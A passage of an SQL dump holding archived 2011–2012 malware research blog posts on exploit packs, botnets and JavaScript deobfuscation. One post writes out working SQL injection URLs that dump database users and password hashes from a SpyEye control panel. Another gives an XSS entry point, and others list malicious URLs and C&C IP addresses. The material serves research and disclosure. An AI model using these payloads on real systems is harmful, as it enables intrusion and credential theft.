to paste here. So you can find it here - http://pastebin.com/MSpCtZH7\nThere are several tricks you can use to deobfuscate it, one of the methodology is discussed in our previous blog post on JavaScript Obfuscation -  http://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-1.html.\n\nThe deobfuscated script is available here - http://pastebin.com/yDjQRD0u. Some of the interesting code has been shown below, the rest you can scratch on the pastebin. \n\nOn successful, deobfuscation, we observed that\n\n1. The script is fingerprinting plugins, OS, User-agent and other information\n2. The malicious domain is running BlackHole BEP.\n3. We accessed certain set of files on the domain, one of which is shown below\n\n\n\n\nSo, the BlackHole is still on fire but attackers now using modular way  of serving exploit. There are other interesting information that we found during analysis but not presenting here. If something more interesting comes up, we will update it here.\n\nHow to be secure?\n\n1. Update plugins to the latest version.\n2. Think twice before your click. \n\nBe secure !', '', 'https://secniche.blogspot.com/2012/06/linkedin-phishing-attack-exploit.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, '\nFor Fun - XSS in ICE IX C&C Panel \n', 'Aditya K Sood', '2012-06-12T08:22:00-07:00', 'Our team is working on ICE IX botnet analysis. We will be releasing a detailed paper about the working of ICE bot in coming time (very soon). However, this post is meant for some fun purposes but the provided information can be used to complete different tasks. We have detected an interesting XSS in main login page of ICE botnet C&C panel. It does not require any authentication as such though. The POC is presented in figure below\n\n\n\n\n\n\n So what exactly you have to do is to hack the below XML construct in order to trigger it \n.\n\n\n\nThe interesting part is to understand the entry point in this as discussed. \n\nConsider this, /adm/index.php?m=login , so usually \"m\" parameter in this URI is considered as an entry point which is true in certain sense. However, for this XSS, the entry point is present in /adm/index.php/ [Injection Point] ?m=login.\n\nSo, the point is, XSS finds its own entry points. :)\n\nBrowser Security Talk: \nOn additional note, the above presented screenshot shows that payload is sent in URL and Google Chrome parses it and then the payload becomes persistent. Seems like a bypass, yes it is. It depends whether Google Chrome team considers it or not.  IE and NoScript triggers an alert.\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/06/for-fun-xss-in-ice-ix-bot-admin-panel.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, '\nNGR Bot Analysis - Virus Bulletin Paper [Download]\n', 'Aditya K Sood', '2012-06-08T05:08:00-07:00', 'We have uploaded the paper on analysis of NGR bot. It is also available for download at http://secniche.org/released/VB_AKS_RB_RJE_NGR_BOT.pdf. NGR Bot Analysis Paper', '', 'https://secniche.blogspot.com/2012/06/ngr-bot-analysis-virus-bulletin-paper.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, '\nMalware Design Strategies (Part 2) - Virus Bulletin\n', 'Aditya K Sood', '2012-05-30T13:15:00-07:00', 'Last month, Malware Design Strategies (Part 1) paper  was published in virus bulletin magazine. Continuing from there, part 2 of the paper is published this month\'s. It is available here - http://secniche.blogspot.com/2012/05/malware-design-strategies.html.\n\nIn this paper, we have discussed about:-\n\n1. Polymorphic and metamorphic encryption\n2. Anti-debugging tricks\n3. Ant-traffic analysis stuff\n4. Deployed tactics to detect virulent code.\n\nRight now, subscription is required to read paper. We will release it after couple of weeks.', '', 'https://secniche.blogspot.com/2012/05/malware-design-strategies-part-2-virus.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, '\nIEEE Internet Computing (PrePrint) - Cybercrime - Dissecting the State of Underground Enterprise\n', 'Aditya K Sood', '2012-05-14T07:00:00-07:00', 'Our paper on \"Cybercrime - Dissecting the State of Underground Enterprise\" is available in preprint is available at \n\nhttp://www.computer.org/csdl/mags/ic/preprint/mic2012990274-abs.html\n\nAbstract: Cybercrime’s tentacles are reaching deeply into the Internet. A \ncomplete, underground criminal economy has developed to steal money \nthrough the Web. We detail this underground enterprise showing how \ninformation, expertise and money flow through it. Understanding the \nstructure of this economic enterprise is critical for fighting it.\n\nWe will update the information once it is out in hard copy.\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/05/ieee-internet-computing-preprint.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, '\nCode Hiding in Images - JavaScript Manual Armor (3)\n', 'Aditya K Sood', '2012-05-03T11:12:00-07:00', 'Attackers are always using interesting techniques of hiding code. Image files have been used extensively for hiding payloads in the headers and upon rendering, the payloads get executed. In the past, several applications have been pwned for XSS using this technique in which image header is used to inject the payload. Anyways, it works:). In this post, we came across a generic JavaScript code which is used to render an iframe for injecting code. However, the interesting part in this post is to understand the flow of infection.\n\nWe came across a website and found that the .js files that are used for JSON communication have been injected with some malicious code. At the bottom of the sample js file, we find the following code snippet\n\n\n\n\nThis JavaScript is not that heavy as it is using only unescape. However, the unescape has to be performed two times to get the URL. So we perform a simple step to tweak the code as follows\n\n\n\nAfter doing this, we get the target URL as \"http://incas.co.kr/image/k.jpg\". The iframe is pointing to a image file. Interesting ! Let\'s see what we have\n\n\n\n\nThe image file is actually an ASCII file. We find that there is some hexadecimal code in it. So we clean the code and feed it to the converter as follows\n\nSo it is pointing to an image folder on  \"http://www.spris.com/images/\". On issuing a HTTP request to this URL, we are served with\n\n\n\nThe log.txt file is served only once to the IP.  When we fetch the page, it contains an iframe that is pointed to log.txt file.\n\n\n\n\nWell, we do not find any data in the file. Anyways, that\'s not a problem :). The main point is to analyze the flow. Attackers can use hard obfuscated scripts and follow the same flow of infection.', '', 'https://secniche.blogspot.com/2012/05/code-hiding-in-images-javascript-manual.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, '\nMalware Design Strategies (Part 1) - Virus Bulletin\n', 'Aditya K Sood', '2012-05-03T09:50:00-07:00', 'Our paper on \"Malware Design Strategies (Part 1)\" just got published in the may edition of virus bulletin magazine. In this paper,  we discuss some of the different techniques that are used by present-day malware to circumvent protection mechanisms. This paper delves into some of the most widely used tactics by malware to bypass protection solutions and to detect the presence of other type of malware in the system. In part 1 of this paper, we talk about following methods\n\n1. Detection of windows x86 emulator for running 32 bit dlls on x64 bit systems.\n\n2. Detailed information about various tactics of VM  code detection using memory, registry, Virtual\n   Machine Configuration Interface (VMCI), Media Access Control (MAC), system processes etc.\n   These  methods are typically used to design anti VM code.\n\n3 DLL injections using Asynchronous Procedure Call (APC)\n\n4. Mutex based detection\n\n5. Explicit run time linking to verify the presence of specific DLLs.\n\nFor complete details fetch the paper (require subscription) from - http://www.virusbtn.com/virusbulletin/archive/2012/05/vb201205-malware-design-strategies\n\nWe will be continuing our discussion in the part 2 of this paper.\n\nEnjoy!', '', 'https://secniche.blogspot.com/2012/05/malware-design-strategies.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, '\nFlashback MAC OS X Malware - Can We Control It ?\n', 'Aditya K Sood', '2012-04-26T08:55:00-07:00', 'Flashback malware has been used effectively to infect MAC OS X machines. Typically, it follows the process of drive-by-download attacks to exploit a vulnerability in a stealthy manner which results in downloading of bot in the MAC OS X machines. Several Java vulnerabilities have been used to execute this attack. Flashback scrutinizes the presence of several set of files on MAC OS X machines to detect if there are any anti malware tools installed. If the files are not found, it triggers the routine to install itself and connect back to the C&C server. The list of severs are generated after the successful verification of anti-virus tools. The infected machines are segregated using UUID strings which are unique in nature to manage and control the bots. More details can be found on following links about the behavior of this malware\n\nhttp://news.drweb.com/show/?i=2341&lng=en&c=5\n\n\n\nOur team conducted a small set of experiments and we wrote a detection signature that can be ported directly into IDS running as a peripheral network monitoring device by various ISPs. We are not disclosing the details of the signature but a quick test presented us with a list of IP addresses that are running C&C severs for flashback MAC OS X bots. Here are some of the IP addresses\n\n\n\n23.21.71.54\n142.165.4.26174.129.221.183208.67.216.146212.154.192.9850.116.35.15850.62.12.10367.215.65.132\n208.86.225.3882.141.230.15591.233.244.102\n\n68.178.232.100\n\nSo even the MAC OS X is not secure as believed. We will be doing some static analysis of this malware to understand the design from the core.', '', 'https://secniche.blogspot.com/2012/04/flashback-malware-has-been-used.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, '\nBlackHole BEP Still Rising High!\n', 'Aditya K Sood', '2012-04-25T06:30:00-07:00', 'Last year at Virus Bulletin conference, we presented about the techniques and tactics used by Browser Exploit Packs (BEPs). We discussed about the functionality of BlackHole. The paper can be downloaded from http://www.secniche.org/papers/VB_2011_BRW_EXP_PACKS_AKS_RJE.pdf.\n\nWe also discussed about the exploit distribution mechanism in BEPs by presenting the study of Phoenix BEP in the HITB Ezine.The paper can be downloaded from http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-008.pdf.\n\nHowever, we have not seen any decrease in the infection rate of BlackHole BEP. Our team conducted some tests and results are as expected. Deployed IDS signatures collected several IP addresses that are infected with BlackHole. We are not disclosing the details of our detection payloads. Here is a list of IP addresses as presented below\n\n176.65.155.84   199.230.54.74  206.188.192.117       \n195.39.12.62   174.36.24.216    206.188.192.129   195.210.4.16  205.178.145.119    \n173.230.138.185   115.249.190.46   12.133.182.133  206.188.192.37 \n68.178.232.100\n205.178.145.150    \n74.207.249.7  206.188.192.79    205.178.145.125   206.188.192.148\n205.178.145.65   195.39.12.61   199.30.89.187 \n206.188.192.116  176.65.157.82    205.178.145.142   199.30.89.180    205.178.145.140  \n206.188.192.74  \n188.190.98.79\n205.178.145.124     173.212.218.123   206.188.192.188  205.178.145.130    184.173.73.174     193.200.167.30    206.188.192.13    193.104.153.44    206.188.192.21    205.178.145.71   206.188.192.40 \n129.121.93.254   141.136.16.116    206.188.192.230  \n206.188.192.244   109.235.49.23   206.188.192.89    \n\nMost of these IP addresses are found to be in Canada and US. The point is, BlackHole BEP is still rising high. We are still in process of conducting more experiments to decipher the running behavior of BlackHole.', '', 'https://secniche.blogspot.com/2012/04/blackhole-bep-still-rising-high.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, '\nJavaScript Obfuscation - Manual Armor (2)\n', 'Aditya K Sood', '2012-04-23T05:43:00-07:00', 'Everyday we encounter different set of obfuscated scripts running hidden iframes in the infected websites. Several of the Brazilian (.br) domains are serving a similar set of obfuscated scripts. One of the example has been discussed earlier in our article - JavaScript Obfuscation - Manual Armor (1). We came across another variant of this file. A simple methodology has been presented in the earlier post. This time we have an obfuscated JavaScript as follows\n\n\n\n\nSo, we need to clean it and we did as follows:\n\n\n\nAt this point, we need to get the value of variable \"f\" which can be calculated using JavaScript interpreter by triggering \"split\" calls. and then feeding into the loop so that every single element value is increased by 41 ( values with \"+\" and \"-\" will be added and subtracted respectively). After\nall this, a simple python program having list with these elements and applied logic results in the deobfuscation of JavaScript as follows\n\n\n\n\nSo we get the URL serving malware, that\'s what we want. :)', '', 'https://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-2.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, '\nExploit Distribution Mechanism in BEPs - HITB\n', 'Aditya K Sood', '2012-04-11T06:56:00-07:00', 'We have release another paper on exploit distribution mechanism in Browser Exploit Packs (BEPs).\n\nAbstract:\"Browser Exploit Packs (BEPs) have been used extensively for spreading malware. In this paper, we present details of the techniques chosen by malware writers to distribute exploits across the Internet.\"\n\n\n\nDownload - http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-008.pdf', '', 'https://secniche.blogspot.com/2012/04/exploit-distribution-mechanism-in-beps.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, '\nJavaScript Obfuscation - Manual Armor (1)\n', 'Aditya K Sood', '2012-04-07T14:44:00-07:00', 'Recently, we came across a similar set of obfuscated JavaScripts that are being used continuously in conjunction with automate Browser Exploits Packs (BEPs) such as BlackHole etc. There are several variations of this type of obfuscated JavaScript. Our team prefer to do obfuscation manually because sometimes automated tools are not good enough to perform the deobfuscation. In this post, we are going to discuss about the methodology that  we prefer to follow at SecNiche labs. Let\'s take a look at the obfuscated JavaScript shown below\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe methodology  goes like this:\n\nStep1: Beautify Your JavaScript: \nThe very first (basic) step is to beautify the obfuscated JavaScript. For analysis perspective, beautifying the code such as appropriate indentation makes it very easy to decipher the initial structures in the JavaScript. Always do this step before proceeding further.\n\nStep 2: Divide and Rule\nThis strategy works perfectly fine while analyzing obfuscated JavaScripts. The motive behind this step is to analyze the code in small snippet for better grasp.\n\nApplying step 1 and step 2 to the given JavaScript code,  we get part 1 of the code as follows\n\n\n\n\nand part 2 of the code as follows\n\n\n\n\nIn part 2, to interpret the given code as single string , one has to use characters [\"\" +]. Even for doing automated analysis, these parameters are required to be tuned so that appropriate interpretation of the string can be done. Check the string passed to variable \"n\".\n\nStep 3: Extract the Logic \nOn the modular code (divided code snippets), try to apply the logic step by step (top to bottom). When we compute the value of \"h\" we get : h=-2*Math.log(Math.E);   //     h = -2      //\nThe next logic is to compute the value of \"n\" first. We have the n=\"[string]\".split(\"a\"), which means we have to split the string. By default, split function actually dissects the string n by a delimiter \",\". We tweak the code a bit as presented below:\n\n\n \n\nOn executing this code in JavaScript interpreter we get the output as follows,\n\n\n\n\nAt this point, we successfully unwraps some part of code by having the value of h and n. Now, we have to dissect the loop present in the part 2 as follows\n\nfor(i=0;-n.length<-i;i++)        {            j=i;            ss=ss+s[f](-h*(1+1*n[j]));        }        if(1)q=ss;    if(s)e(q);\n\nTo compute the code finally, we need to unwrap the logic used in the loop. Step 4 involves the automation of the code.\n\nStep4: Automating the Process - Python\nIn step 4, we need to automate the process to get the next value of the string. On understanding the logic, we write a following python script to compute the loop\n\n\n\n\nThe code actually multiply the every single value by 2 and build up the new string. So, we are almost at the end. So we need to build up the final code as presented below\n\n\n\n\nSo here we have the final script as follows\n\n \n\nA good methodology always  helps to attain the target.', '', 'https://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-1.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, '\nConferences Presentation Slides are Posted\n', 'Aditya K Sood', '2012-04-04T20:03:00-07:00', 'I have uploaded the PDF\'s of my talks from last two years. You can download it from : http://secniche.org/presentations.html\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/04/presentation-slides-up.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, '\nVB Magazine - Zombifying Targets using Phishing Campaigns\n', 'Aditya K Sood', '2012-04-03T06:13:00-07:00', 'Abstract: Phishing has grown exponentially over recent years. In this article we analyse the Google E-Card phishing campaign and its accompanying binary to show how a victim’s machine is compromised. Aditya Sood and Richard Enbody analyse the details of the Google\n      E-Card phishing campaign and its accompanying malicious binary to\n      understand the propagation and distribution of the malware.\n\nhttp://www.virusbtn.com/virusbulletin/archive/2012/04/vb201204-zombifying\n\nEnjoy !', '', 'https://secniche.blogspot.com/2012/04/hrefhttp3.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, '\nVB 2011 Paper - BEPs - Exploitation Tactics\n', 'Aditya K Sood', '2012-03-14T09:04:00-07:00', 'UPDATE: http://www.secniche.org/papers/VB_2011_BRW_EXP_PACKS_AKS_RJE.pdfVirus bulletin 2011 Conference Paper - Browser Exploit Packs - Exploitation TacticsView more documents from Aditya K Sood.', '', 'https://secniche.blogspot.com/2012/03/vb-2011-paper-beps-exploitation-tactics.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, '\nCrossTalk - iPhone Malware Paradigm\n', 'Aditya K Sood', '2012-03-09T17:44:00-08:00', 'We just released a new paper on iPhone Malware paradigm in CrossTalk Journal. Abstract:The sphere of malware attacks is expanding to engulf the compact world of smartphones. This paper sheds light on exploitation tactics used by malware writers in designing iPhone applications that exploit the integrity of the victim’s phone. Our interest is in the harder problem of malware on iPhones that are not jailbroken. Fetch the journal here: http://www.crosstalkonline.org/storage/issue-archives/2012/201203/201203-0-Issue.pdf', '', 'https://secniche.blogspot.com/2012/03/crosstalk-iphone-malware-paradigm.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, '\nIntuit and BBB Under Targeted Attacks - Phishing (Malware)\n', 'Aditya K Sood', '2012-03-05T09:05:00-08:00', 'About BBS and Intuit: Better Business Bureau    is an ethical marketplace where buyers and sellers can trust each other, as defined here . Intuit provides a powerful software as a service platform.ALERT: Be careful in clicking links.BBB and Intuit are under targeted attacks. Other organization that is under targeted attacks. Phishing emails pointing to malicious domain serving obfuscated iframes are being thrown in the wild at a rapid pace. The emails look very legitimate but a single click can cause a serious damage. Since these are big organizations, we feel that risk is much higher. That\'s why the alert is here.Malicious - Phishing Email Targeting - BBB Malicious - Phishing Email Targeting - INTUIT The gift that malicious domain send us is presented below(truncated version)The deobfucation details of this script will be posted soon. We are analyzing other facets of this targeted attack.', '', 'https://secniche.blogspot.com/2012/03/intuit-and-bbb-under-targeted-attacks.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, '\nCloud Infections on Fire - Amazon\'s WS\n', 'Aditya K Sood', '2012-03-03T20:22:00-08:00', 'It has been seen recently that Amazon\'s Web Service (AWS) has become the playground for attackers to host malware. Some incidents have been reported early. However, cloud services are providing a good storage as well as remote access property for serving malware through cloud. Attackers are always impressive in circumventing the normal operations of any cloud services in order to distribute malware effectively. We came across another incident in which malware is hosted at  AWS server. We started exploring the malware driven directory. The direct access to the directory was not allowed and we received following error.This shows that the directory is in forbidden state which resulted in the HTTP error as presented above. We required to have direct link to the malicious executable. On analyzing further and gathering information, the Amazon cloud was hosting malware as shown belowAfter successful downloading, we analyzed that executable was packed with UPX packer with 33.6% compression. On unpacking, the code seemed to unroll a bit and presented us with some complex and lengthy code file. The executable file was actually a package file written in Borland. Its main functionality was to download another set of malicious files from different Amazon AWS directory. The complete set of files were downloaded into \"c:\\winsys\" directory. We extracted another set of files as presented belowThis shows that the package acts as a dropper. We take a look at one of the executable named as \"BROWN.exe\" which was packed with UPX again. So we unpacked it again to understand the crux.The executable was written in \"Visual Basic\". So, we ran a check using anti virus and without a doubt it was a malware as shown belowSo we are not digging deeper. If you require samples, please drop us a line.', '', 'https://secniche.blogspot.com/2012/03/cloud-infections-on-fire-amazon-aws.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, '\nVB - Dissecting NGR bot Framework\n', 'Aditya K Sood', '2012-02-24T13:17:00-08:00', 'Last  month, we released our paper on NGR bot. Abstract: \"The latest variants of IRC-based botnets, such as the NGR botnet, are designed to steal sensitive information by exploiting browser processes and acting as backdoors. Aditya Sood and colleagues discuss the framework of the NGR bot version 1.1.0.0, which is growing in prominence in the malware world.\"Its here: http://www.virusbtn.com/virusbulletin/archive/2012/01/vb201201-NGR-botnetEnjoy!', '', 'https://secniche.blogspot.com/2012/02/vb-dissecting-ngr-bot-framework.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, '\nCommercial Crime International - Social Networks Article\n', 'Aditya K Sood', '2011-11-28T05:16:00-08:00', 'Commercial Cyber Crime - Social Networks Malware   View more documents from Aditya K Sood  \"The advent of social networks has turned the online world into a virtual society. And whilst social networks serve as seamless communication channels, they are also an ideal launch pad for malware infections. There has been a tremendous increase in the dissemination of malware infections through social networks.\"Checkout article in Commercial Crime International - ISSN 1012-2710', '', 'https://secniche.blogspot.com/2011/11/commercial-cyber-crime-social-networks.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, '\nVirus Bulletin - Formgrabbing on Fire\n', 'Aditya K Sood', '2011-11-26T12:24:00-08:00', 'Botnets such as Zeus, SpyEye and others use the effective technique of form grabbing to steal sensitive information from victims’ machines. We are presenting the complete details of  form-grabbing technique.http://www.virusbtn.com/virusbulletin/archive/2011/11/vb201111-form-grabbing', '', 'https://secniche.blogspot.com/2011/11/virus-bulletin-formgrabbing-on-fire.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, '\nBlackHole BEP + HP Scanner Infections\n', 'Aditya K Sood', '2011-10-17T09:35:00-07:00', 'We have recently encountered a heavy set of email traffic spreading HP scanning email with non legitimate links. No doubt, this campaign is a traffic infection process by sending plethora of emails around the internet. It is not a big deal of getting email addresses nowadays. It is just a walk-around in the park for the phishers or attackers. This HP scanning email looks like as presented belowThe only part that interests in giving a brief shot at this malware campaign is the usage of Java Exploits through BlackHole BEP.The user is forced or tricked to visit a domain with URL hxxp://finance-motor.info/main.php which is further redirected to malicious domain hxxp://ahredret.ru/main.php. Now the URL, which is from russian domain with following informationdomain:     AHREDRET.RUnserver:    dns1.naunet.ru.nserver:    dns2.naunet.ru.state:      REGISTERED, DELEGATED, UNVERIFIEDperson:     Private Persone-mail:     mxx3@yandex.ruregistrar:  NAUNET-REG-RIPNcreated:    2011.10.06paid-till:  2012.10.06source:     TCILast updated on 2011.10.17 20:35:46 MSK/MSDThe above presented information shows that this domain is activated and is recently accessed. The active time stamp shows that this is an active infection process. Without a doubt, the domain has port 80 and port 22 opened. The port 80 serves the BlackHole BEP and port 22 is for administration as shown below22/tcp   open     ssh            OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: 1024 bb:d1:ae:ea:db:46:97:2a:09:ca:38:cc:50:47:9c:24 (DSA)|_1024 39:1d:f5:8c:fa:ad:9c:02:a0:bf:db:9d:2a:24:73:bb (RSA)80/tcp   open     http           nginxSo, the next step is to try with wepawet but as expected the server did not respond well to the tool as presented belowThe automated HTTP request/response and detection module did not work appropriately. At last, its all about manual analysis by setting an appropriate sandbox environment. We preferred to have a generic settings that provide malware an opportunity to expand and gives us the information that is required. So on performing manual testing carefully, we were served with exploit prototype as followsThe field.jar contains the following set of Java filesWe have already performed analysis on this kind of exploit which is used effectively by the BlackHole (Java is what I like the most for spreading infections).Fetch the code - http://www.secniche.org/sample_exploits/hp_scan_exploit.rarEnjoy !', '', 'https://secniche.blogspot.com/2011/10/blackhole-bep-hp-scanner-infection.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, '\nVirus Bulletin 2011 Conference -  Death by Bundled Exploits\n', 'Aditya K Sood', '2011-10-08T13:31:00-07:00', 'We have presented about our research at Virus Bulletin conference 2011.  Virus Bulletin 2011 Conference - Browser Exploit Packs - Death by Bundled Exploits   View more presentations from Aditya K Sood  Threatpost coverage : http://threatpost.com/en_us/blogs/researcher-malware-increasingly-interdependent-stifles-security-wares-100711Enjoy!', '', 'https://secniche.blogspot.com/2011/10/virus-bulletin-2011-conference-browser.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, '\nOWASP AppSec USA 2011 - Dismantling  Web Malware\n', 'Aditya K Sood', '2011-10-02T20:26:00-07:00', 'OWASP AppSec USA 2011 - Hunting Web Malware   View more presentations from Aditya K Sood', '', 'https://secniche.blogspot.com/2011/10/owasp-appsec-usa-2011-hunting-web.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, '\nVirus Bulletin - Browser Malware Taxonomy\n', 'Aditya K Sood', '2011-09-29T16:29:00-07:00', 'Browser Malware Taxonomy   View more documents from Aditya K Sood  Journal : http://www.virusbtn.com/virusbulletin/archive/2011/06/vb201106-browser-malware-taxonomyWe will be releasing more papers from Virus Bulletin, once we complete the three month time period from the date of publication. Its all about serving the contract.', '', 'https://secniche.blogspot.com/2011/09/virus-bulletin-browser-malware-taxonomy.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, '\nBruCon 2011 - Botnets and Browsers\n', 'Aditya K Sood', '2011-09-20T15:17:00-07:00', 'BruCon (Brussels 2011) Hacking Conference - Botnets and Browsers (Brothers in the Ghost Shell)   View more presentations from Aditya K Sood', '', 'https://secniche.blogspot.com/2011/09/brucon-2011-botnets-and-browsers.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, '\nBlasting SpyEye C&C - SQL Injection Wins\n', 'Aditya K Sood', '2011-08-31T06:29:00-07:00', 'The world has changed dramatically with the evolution of malware. A similar set of vulnerabilities ( web attacks specific) such as SQL injection can be used to compromise the malware driven server. Some time ago, we talked about Blind SQL Injection in SpyEye Version 1.0 in which we presented about the vulnerability in the SpyEye code. Since then we dint get the time to present it as a complete case study. In this post, we are going to talk about the step by step approach to compromise the SpyEye database server. One can do lot of different attacks such as Local File Inclusion (LFI) there by reading the configuration credentials. However, we are sticking to the SQL injection to show how well we can inject and take control of malware server.\r\rThe vulnerability affects the latest version of spyeye (1.3) within \"frmcp0/frm_findrep_sub2.php?id=\". The good point is this SQL injection works right on the fly without any authentication. \r\rInjection 1: Version Disclosure - http://spyeye_domain.com/frmcp /frm_findrep_sub2.php?id=-999999%20union%20all%20select%200x31,concat(0x7e,0x27,version(),0x27,0x7e),0x33,0x34,0x35,0x36,0x37--+\r\r\r\rYou can see the injection is occurring in the title field. This suggests that our payload is getting injected. On similar testing pattern, let\'s perform some other set of injections as presented below\r\rInjection 2: Database Verification - http://spyeye_domain.com/frmcp0/frm_findrep_sub2.php?id=-999999%20union%20all%20select%200x31,concat(0x7e,0x27,database(),0x27,0x7e),0x33,0x34,0x35,0x36,0x37--+\r\r\r\rInjection 3: Information Schema Disclosure - \rhttp://spyeye_domain.com/frmcp0/frm_findrep_sub2.php?id=-999999 union all select 0x31,concat(0x7e,0x27,group_concat(column_name),0x27,0x7e),0x33,0x34,0x35,0x36,0x37 from `information_schema`.columns where table_schema=0x6d7973716c and table_name=0x75736572--+\r\rThe disclosed schema is as follows\r\rHost,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,\rCreate_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,\rGrant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,\rCreate_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,\rRepl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,\rAlter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,\rx509_subject,max_questions,max_updates,max_connections,max_user_connections \r\rInjection 4: Pwning MySQL Database - http://spyeye_domain.com/frmcp0/frm_findrep_sub2.php?id=-999999 union all select 0x31,concat(0x7e,0x27,user.User,0x3a,user.Host,0x3a,user.Password,0x27,0x7e)\r,0x33,0x34,0x35,0x36,0x37 from `mysql`.user limit 0,1--+\r\r\r\rSo this discussion has proved the fact that security vulnerabilities can be fruitful in hunting back malware. We will be giving a detailed talk on Hunting Web Malware at OWASP and Hacker Halted this year.\r\rOWASP AppSec USA - http://www.appsecusa.org/talks.html#goodhacker\r\rHacker Halted : http://www.hackerhalted.com/2011/Presenters.aspx\r\rStay tuned.', '', 'https://secniche.blogspot.com/2011/08/blasting-spyeye-c-sql-injection-wins.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, '\nSpyEye - RDP BackConnect Plugin and Total Commander\n', 'Aditya K Sood', '2011-08-07T20:31:00-07:00', 'Well, malware has many facets and there is no doubt in that. In this post, we are going to raise a point about the SpyEye RDP back-connect plugin and its working. During out talk at Hack In The Box (HITB) - AMS, we presented about the details of SpyEye botnet and its ability to work with modular plugins. The RDP plugin in SpyEye works on the same benchmarks as FTP and SOCKS. Generally, the bot is compiled up with different plugins. The RDP plugin starts a dynamic server on the client machine where the bot is installed. From the victim machine, the bot connects back to main server over RDP. The plugin is well equipped enough to create a hidden user in the victim machine and this account is used to for back server connections. However, this plugin is good enough to allow the remote command server to execute commands on victim machine using RDP. In addition, the SpyEye bot downloads the portable version of Total Commander from the internet and execute it in the memory on the fly. The beauty of this plugin is that it does not require any system restart when Total Commander is downloaded and installed into the victim machine.The plugin requires following environmental variables in order to specify the required information for plugin execution%IP_OF_BC_SERVER%%PORT_OF_BC_SERVER%%MAGIC_CODE% %WINDOWS_LOGIN%%WINDOWS_PASSWORD%%URL_TO_PORTABLE_TCMD% The connection to the bot can be performed using standard Windows tool mstsc.exe Remote Desktop Connection:. It has also been observed that this plugin support only x86 OS and not x64 architectures. In the coming time, hopefully this will be released too.', '', 'https://secniche.blogspot.com/2011/08/spyeye-rdp-backconnect-plugin-and-total.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, '\nVirus Bulletin - SpyEye Exploitation Tactics\n', 'Aditya K Sood', '2011-08-02T08:24:00-07:00', 'As a follow-up to our article on the SpyEye malware infection framework, we are discussing the SpyEye bot and the tactics it uses for stealing information from victim machines.Fetch the paper from here : http://www.virusbtn.com/virusbulletin/archive/2011/08/vb201108-spyeyeRight now available for subscribers only.', '', 'https://secniche.blogspot.com/2011/08/virus-bulletin-spyeye-exploitaion.html\n');
